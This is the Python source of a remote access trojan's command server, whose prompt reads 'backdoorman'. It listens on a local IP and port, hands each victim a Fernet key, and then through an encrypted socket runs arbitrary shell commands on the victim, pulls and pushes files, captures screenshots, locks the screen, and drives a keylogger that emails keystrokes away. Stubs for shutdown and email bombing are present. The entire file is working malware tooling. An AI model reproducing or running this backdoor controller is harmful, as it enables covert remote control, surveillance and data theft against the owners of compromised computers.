import json
import socket
import os
import time
import uuid
from cryptography.fernet import Fernet


HOST = "192.168.1.37"
PORT = 6666
BUFF = 1024


def _decode_(data):
    try:
        return data.decode()
    except UnicodeDecodeError:
        try:
            return data.decode("cp437")
        except UnicodeDecodeError:
            return data.decode(errors="replace")

def create_socket():
    global objSocket
    try:
        objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as stderr:
        print(f"[-] Error creating socket {stderr}")

def socket_bind():
    global objSocket
    try:
        print(f"[+] Running on IP: {HOST}")
        print(f"[+] Listening on PORT: {PORT}")
        objSocket.bind((HOST,PORT))
        objSocket.listen(100)
    except socket.error as stderr:
        print(f"[-] Error socket binding {stderr}. Retrying...")
        socket_bind()

def socket_accept():
    global objSocket, objKey, conn, addr
    try:
        conn, addr = objSocket.accept()
        conn.setblocking(1)
        conn.send(objKey)
        info = json.loads(conn.recv(BUFF).decode())
        print(f"[+] Connected by {addr}.")
        print(info)
    except socket.error as stderr:
        print(f"[-] Error accepting connection! {stderr}.")

def create_encryptor():
    global objKey, objEncryptor
    objKey = Fernet.generate_key()
    objEncryptor = Fernet(objKey)


send = lambda data: conn.send(objEncryptor.encrypt(data))
recv = lambda buffer: objEncryptor.decrypt(conn.recv(buffer))

def sendall(flag, data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(f"{flag}{intDataSize}".encode())
    time.sleep(0.2)
    conn.send(bytEncryptedData)
    print(f"[+] Total bytes sent: {intDataSize}")

def recvall(buffer):
    bytData = b""
    while len(bytData) < buffer:
        bytData += conn.recv(buffer)
    return objEncryptor.decrypt(bytData)


def send_file():
    strFile = input("\nFile to Send: ")
    if not os.path.isfile(strFile):
        print("[-] Invalid File!")
        return

    strOutputFile = input("\nOutput File to Save: ")
    if strOutputFile == "":
        print("[-] Invalid Path!")
        return

    with open(strFile, "rb") as objFile:
        sendall("send", objFile.read())

    send(strOutputFile.encode())

    intBuffer = int(recv(BUFF).decode())

    strClientResponse = recv(BUFF).decode()
    print(strClientResponse)


def lock():
    send(b"lock")
    strResponseSize = recv(BUFF).decode()
    strResponse = recv(BUFF).decode()
    print(strResponse)

def shutdown():
    pass

def screenshot():
    send(b"screenshot")
    strSSSize = recv(BUFF).decode()
    print(f"\n[+] Receiving Screenshot\n[+] File size: {strSSSize} bytes\n[+] Please wait...")
    intBuffer = int(strSSSize)
    strFileName = unique_name_creator()
    ssData = recvall(intBuffer)
    with open(strFileName, "wb") as f:
        f.write(ssData)

    print(f"[+] Done!\n[+] Total bytes received: {os.path.getsize(strFileName)} bytes")

def unique_name_creator():
    unique_name = str(uuid.uuid4()) + ".png"
    return unique_name


def receive_file():
    strFile = input("\nTarget file: ")
    strFileOutput = input("\nOutput File: ")

    if strFile == "" or strFileOutput == "":  # if the user left an input blank
        return

    send(("recv" + strFile).encode())
    strClientResponse = recv(BUFF).decode()

    if strClientResponse == "[-] Target file not found!":
        print(strClientResponse)
    else:
        print(f"[+] File size: {strClientResponse} bytes\n[+] Please wait...")
        intBuffer = int(strClientResponse)
    file_data = recvall(intBuffer)  # get data and write it

    try:
        with open(strFileOutput, "wb") as objFile:
            objFile.write(file_data)
    except:
        print("[-] Path is protected/invalid!")
        return

    print(f"[+] Done!\n[+] Total bytes received: {os.path.getsize(strFileOutput)} bytes")


def email_bomb():
    pass


def keylogger():
    print("[+] Keylogger is running...")
    send("keylogger".encode())
    new_order = "start"
    while new_order.lower() != "stop":
        if new_order != "stop":
            print("[+] Keylogs are being sent to your email addres as text file.")
            print("[+] Please wait...")
            response = ""
            while True:
                response = recv(BUFF).decode()
                if response == "[+] Give an order(start/stop).":
                    print(response)
                    new_order = input("\n>>")
                    send(new_order.encode())
                    break


def receive_info_as_mail(tobesent):
    send(tobesent)
    responseSize = int(recv(BUFF).decode())
    response = recv(BUFF).decode()
    print(response)


def run():
    while True:
        order = input("backdoorman>>")
        if order in ["exit", "quit"]:
            send(b"goback")
            break
        elif order[:6] == "upload":
            send_file()
        elif order[:8] == "download":
            receive_file()
        elif order[:4] == "lock":
            lock()
        elif order == "screenshot":
            screenshot()

        elif order == "keylogger":
            keylogger()

        elif order[:4] == "mail":
            receive_info_as_mail(order.encode())

        elif len(order) > 0:
            send(order.encode())
            intBuffer = int(recv(BUFF).decode())
            strClientResponse = _decode_(recvall(intBuffer))
            print(strClientResponse)


def main():
    create_encryptor()
    create_socket()
    socket_bind()
    socket_accept()
    run()

main()